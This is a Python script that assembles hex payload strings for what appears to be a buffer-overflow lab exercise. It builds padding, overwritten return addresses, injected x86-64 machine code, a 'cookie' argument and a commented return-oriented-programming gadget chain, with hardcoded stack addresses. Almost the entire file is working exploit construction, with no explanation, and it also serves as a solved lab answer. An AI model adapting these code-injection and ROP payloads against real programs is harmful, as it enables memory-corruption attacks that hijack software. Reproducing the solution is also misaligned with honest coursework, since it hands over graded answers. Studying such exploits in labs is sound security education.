def convert_to_char(input_string):
    # Assuming the input string is in the format "00"
    try:
        # Convert the input string to an integer
        ascii_code = int(input_string)

        # Get the corresponding character using the chr() function
        result_char = chr(ascii_code)

        return result_char
    except ValueError:
        # Handle the case where the input string is not a valid integer
        return "Invalid input, please provide a valid integer string."

byte = "00"
t_byte = byte+" "+byte
f_byte = t_byte+" "+t_byte
e_byte = f_byte+" "+f_byte

print(byte)
print(t_byte)
print(f_byte)
print(e_byte)

offset = 11
l1 = ""

for _ in range(offset):
    l1 += byte + " "

l1 += "de 15 40 00 00 00 00 00" + " "
l1 += "74 10 00 00 00 00 00 00" + " "


l2 = ""
for _ in range(offset - 2):
    l2 += e_byte + " "
l2 += "bf b7 10 a5 1e be b8 10" + " "
l2 += "a5 1e c3 00 00 00 00 00" + " "

l2 += "00 44 67 55 00 00 00 00" + " "
l2 += "0c 16 40 00 00 00 00 00"






l3 = ""

l3 += "31 65 61 35 31 30 62 37 "
l3 += "00 32 00 66 00 62 00 36 "
l3 += "00 32 00 31 00 63 00 38 "
l3 += "00 48 8d 3c 25 b8 43 67 "
l3 += "55 48 8d 34 25 c1 43 67 "
l3 += "55 c3 00 00 00 00 00 00 "

for _ in range(offset - 6):
    l3 += e_byte + " "


l3 += "d1 43 67 55 00 00 00 00 "
l3 += "09 18 40 00 00 00 00 00"



l4 = ""
for _ in range(offset):
    l4 += e_byte + " "

l4 += "ea 18 40 00 00 00 00 00 " #pop rcx
l4 += "b7 10 a5 1e 00 00 00 00 " #cookie
l4 += "06 19 40 00 00 00 00 00 " #mov rax rdi
l4 += "51 19 40 00 00 00 00 00 " #mov rdi rdx
l4 += "37 19 40 00 00 00 00 00 " #mov rdx rsi
l4 += "d6 18 40 00 00 00 00 00 " #addq rcx rsi
l4 += "5d 19 40 00 00 00 00 00 " #mov rcx rax
l4 += "06 19 40 00 00 00 00 00 " #mov rax rdi
l4 += "0c 16 40 00 00 00 00 00"


# l4 += "51 19 40 00 00 00 00 00 "
# l4 += "37 19 40 00 00 00 00 00 "

print("l4")
print(l4)
print(len(l4.split(" ")))





print("l3")
print(l3)
print(len(l3.split(" ")))

string = "mert"

print("**")
for i in string:
    print(hex(ord(i)))
print("***")


addr_rsp = 0x0000000055674410
print(addr_rsp)
x = addr_rsp - 88
print(hex(x))
x = addr_rsp - 80
print(hex(x))
x = addr_rsp - 64
print(hex(x))
